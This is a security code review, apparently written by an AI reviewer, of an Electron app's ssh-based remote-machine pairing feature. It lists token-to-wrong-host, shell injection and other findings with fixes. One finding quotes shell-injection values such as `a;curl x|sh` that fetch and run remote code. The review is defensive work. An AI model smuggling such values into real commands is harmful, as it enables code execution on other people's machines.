# Phase E security review — TASK_2026_858_f7b9

## Verdict

REVISE, 6/10. Alias handling, `shell: false`, `--` placement, token storage and the Electron wiring are sound. Two issues need fixing before merge: no worker-identity binding before the token is sent, and the pairing check appears unable to succeed. Nothing was run. This is a read-only review of the code and the plan.

## Findings

### In scope for Phase E

**1. Serious: worker identity is never verified, so the token can go to the wrong host.**
- Location: `libs/backend/remote-machines/src/lib/machine-connection.ts:201-223`, `machine-registry.ts:14-16`.
- `open()` reads `hello.worker` and keeps only `ptahVersion`. It then sends `auth { token }` to whatever answers on `ssh <alias>`. `hello.worker.machineId` is never compared with anything.
- Scenarios that deliver the token to the wrong host:
  - Someone who can write `~/.ptah/remote-machines.json` (no integrity check) repoints a `machineId` entry at a different valid alias.
  - A user edits `~/.ssh/config` so the alias points at another host. The ssh host key is verified, but the token is bound to the alias, not to the worker.
  - A worker is reinstalled or cloned behind the same alias.
- Impact: a valid, high-privilege token is sent to an unintended worker. It is accepted if that worker happens to hold the same secret, or leaked to a hostile host that the user's ssh config already trusts.
- Fix: persist the worker's `machineId` from the `pair.exchange` grant, or from `hello` at pair time, as `workerMachineId` in the registry entry. Before `auth`, require `hello.worker.machineId === workerMachineId`, and set the state to unpaired with no token sent on a mismatch. Also rebind when the alias changes.

**2. Serious: the pair identity check compares the wrong ids and probably always throws.**
- Location: `machines-service.ts:119,137`.
- `machineId` is a local `randomUUID()`. Pairing requires `result.grant.machineId` to equal it. The plan says `grant.machineId` is the worker's id (`implementation-plan.md` ~line 327).
- If the worker returns its own id, pairing always fails with "Pairing returned a different machine". If the worker echoed the local id, there is no worker identity check at all, which is finding 1.
- Fix: compare against the worker identity obtained via `hello` or `machine.info` at pair time, then store it as in finding 1. Add a test that runs the real worker-protocol schema, not a mock.

**3. Serious: remote shell injection through `--workspace`.**
- Location: `ssh-worker-commands.ts:45-50`.
- ssh joins the remote argv into one string that the remote login shell parses. `workspace` is only checked for non-empty and for not starting with `-`.
- A value such as `a;curl x|sh`, `$(cmd)` or a path with spaces executes on the worker. The `-` check blocks option injection but not shell syntax.
- Currently not reachable from the renderer: `pairViaSsh` passes no options (`machines-service.ts:154`). The function is exported and the plan allows workspace narrowing, so this is a latent code-execution flaw.
- Fix: allowlist-validate with something like `^[A-Za-z0-9_./:@-]{1,256}$` (not starting with `-`), or POSIX single-quote every remote argument. The same applies to `WORKER_REMOTE_COMMAND`, which is a constant and safe today. Add a test with `;`, `$()`, backtick, space and newline.

**4. Moderate: worker-controlled text reaches the UI.**
- Location: `machines-rpc.handlers.ts:19-34`.
- `new RpcUserError(error.message, code)` forwards the worker's `WorkerClientError.message` verbatim. A hostile or buggy worker can show misleading text in the UI.
- Fix: use fixed strings per code and drop the worker message.

**5. Moderate: ssh stderr is embedded in transport error text.**
- Location: `ssh-stdio-transport.ts:74`.
- The last 4 KB of remote stderr (banners, hostnames, paths) goes into `Error.message`. Today the generic handler path probably hides it, but it appears in any logger that records the error.
- Fix: log the stderr separately with a length cap and keep it out of `message`.

**6. Moderate: event payloads are forwarded to the renderer with `payload: unknown` and no further schema.**
- Location: `machine-connection.ts:165-184`.
- Frames themselves are parsed by `parseWorkerFrame` at `worker-client.ts:441`. The payload content is unvalidated. This is acceptable only if the renderer treats it as untrusted.
- Confirm the renderer renders it through the sanitized markdown path. I did not verify this.

**7. Moderate: oversize frames are rejected after they are buffered.**
- Location: `machine-connection.ts:85-88`, `worker-client.ts:441`.
- The `ws` client is created without `maxPayload`, so the default of 100 MiB applies. A hostile worker can make the app buffer large messages before the 1 MiB check.
- Fix: pass `{ maxPayload: WORKER_LIMITS.maxPayloadBytes }` to `new WebSocket(...)`.

**8. Moderate: registry read has no size limit, and directory permissions are applied only at creation.**
- Location: `machine-registry.ts:31-44,55`.
- The `0o700` mode applies only when `mkdir` creates the directory. An existing `~/.ptah` with looser permissions is not tightened. The registry holds no secrets, so the impact is integrity only.
- The file is not signed or checked, which is what makes finding 1 exploitable.
- Fix: `stat` and cap the read size (for example 256 KB), and cap the machine count.

**9. Minor: temp-file name and registry lock.**
- Location: `machine-registry.ts:56-63`.
- The name uses `Date.now()` and `Math.random()`. This is safe because of the `wx` and `0o600` open flags: it will not follow a symlink or overwrite an existing file. Prefer `crypto.randomUUID()`.
- Write atomicity within one process is covered by `serialize`. Two Ptah processes can still race. This is the same limitation as the existing settings code.

**10. Minor: `pairViaSsh` reads the registry outside `serialize`.**
- Location: `machines-service.ts:150-161`.
- A remove during the 15 s ssh call is caught by `pair`, which re-reads the registry. It is benign.

### Pre-existing or later phase

- `ssh -o BatchMode=yes` leaves host-key policy to the user's ssh config. An unknown host key is refused in batch mode. Pinning the worker identity is finding 1.
- The plain-text keyring warning is available via `MachineTokenStore.warning()`. Confirm that a later UI phase surfaces it; it is not part of the RPC result checked here.

## Checks performed

1. **ssh argument injection — PASS with a latent exception.**
   - `validateSshAlias` runs in `runSshWorkerCommand` and `createSshStdioTransport`. The same regex is applied in the add schema, in the registry zod schema on read and write, and when listing `~/.ssh/config`.
   - The alias is always placed after `--`; `shell: false` is set. The pair TTL is bounded to an integer from 60 to 900.
   - The workspace value is not shell-safe (finding 3).
2. **Token handling — PASS except identity binding.**
   - Tokens are stored only through `ISecretStorage` under `remote-machine:<id>:token`. They are not in the registry, RPC results or push payloads (summaries and state carry no token).
   - The token is deleted on removal. The plain-text warning exists in `MachineTokenStore`.
   - The `hello` frame is sent before `auth`, so the token goes to whatever answers (finding 1). The store key differs from the plan's `remoteMachines.token.<id>`, which is only cosmetic.
3. **Registry file — PASS with minor gaps.**
   - Strict zod schema; corrupt content throws and refuses to overwrite. The temp file is `wx` with `0o600`, fsynced and renamed, and the directory is synced. Findings 8 and 9 apply.
4. **Untrusted worker input — PARTIAL.**
   - Status and pair output is zod-parsed and capped at 1 MB. Frames are parsed through `worker-protocol`. Findings 4 to 7 apply.
5. **Renderer to main RPC surface — PASS.**
   - Every method parses params with `MACHINES_RPC_PARAMS_SCHEMAS` and returns `INVALID_PARAMS` on failure. `add` requires an alias already listed in the user's ssh config.
   - There is no free-form command, path or alias beyond that, and no token is returned. The `pair` code comes from the renderer, which is the intended flow.
6. **Resource exhaustion — PASS with notes.**
   - Reconnect uses jittered backoff capped at 30 s, with a single `connecting` guard. Each attempt spawns one ssh process and it is destroyed on close.
   - The ssh stderr buffer is bounded to 4 KB and status stdout to 1 MB. The sessions map grows only on user attach.
   - ws `maxPayload` is the exception (finding 7).
7. **Electron wiring — PASS.**
   - `phase-4-handlers.ts:222-250` and `wire-runtime.ts:343-368` register only the `machines:*` surface. Startup failures log the error object, which holds no token (not confirmed against every code path).
   - Auto-retry on startup runs for each registered machine; unpaired machines do not connect.

## Review family

Implementer: Codex. Reviewer: Claude (different family).
